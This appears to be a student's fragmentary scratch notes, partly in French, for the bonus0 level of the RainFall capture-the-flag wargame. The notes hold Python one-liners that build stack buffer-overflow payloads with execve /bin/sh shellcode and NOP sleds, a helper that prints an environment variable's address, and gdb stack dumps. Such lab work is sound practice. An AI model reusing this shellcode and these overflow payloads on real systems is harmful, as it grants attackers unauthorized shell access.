
echo "python -c 'print 
"A"*4096 + "\n" + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x10\xfc\xff\xbf"')"






#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
    char* ptr = getenv("SHELL");
    printf("%p\n", ptr);
}


bonus0@RainFall:/tmp$ python -c "print 'A'*4095 + '\n' + 'BBBBBBBBBBBBBBBBB'" > /tmp/test

bonus0@RainFall:/tmp$ cat  /tmp/test - | ltrace ./bonus0


AAAAAAAAAAAAAAAAB depasse de 1 


AAAAAAAAAAAAAAAA OK  16 charactere 18 ? > 

with segfault :

Breakpoint 1, 0x080484b4 in p ()
(gdb) i r $esp
esp            0xbffff65c	0xbffff65c
(gdb) x/4xw $esp
0xbffff65c:	0x08048539	0xbffff688	0x080486a0	0x00000000
(gdb) c
Continuing.
 -

Breakpoint 1, 0x080484b4 in p ()
(gdb) i r $esp
esp            0xbffff65c	0xbffff65c
(gdb) x/4xw $esp
0xbffff65c:	0x0804854c	0xbffff69c	0x080486a0	0x00000000
(gdb) c



with 65 A 

Breakpoint 1, 0x080484b4 in p ()
(gdb) i r $esp
esp            0xbffff65c	0xbffff65c
(gdb) x/4xw $esp
0xbffff65c:	0x08048539	0xbffff688	0x080486a0	0x00000000
(gdb) c
Continuing.
 -

Breakpoint 1, 0x080484b4 in p ()
(gdb) i r $esp
esp            0xbffff65c	0xbffff65c
(gdb) x/4xw $esp
0xbffff65c:	0x0804854c	0xbffff69c	0x080486a0	0x00000000


BFFFF65D adresse suivante 

bonus0@RainFall:~$ python -c "print 'A'*4095 + '\n' + 'A'*16 + '\xff\xf8\xff\xbf'" > /tmp/test

a * 16 + BFFFF65D + shellcode 
'A'*16 + 
'\x5d\xf6\xff\xbf' +  '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'



python -c "print 'A'*4095 + '\n' + 'A'*9 + '\x03\xf8\xff\xbf' + 'C'*3000" > /tmp/test

'\xff\xf8\xff\xbf'
sh env 0xbffff8ff

my sh 0xbffff803

python -c "print 'A'*4095 + '\n' + 'A'*16 + '\x03\xf8\xff\xbf'" > /tmp/test





python -c "print 'A'*4095 + '\n' + '\x90'*42+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'+'\x60\xf5\xff\xbf'" > /tmp/test

0xbffff560


b *0x08048559


0xbffff803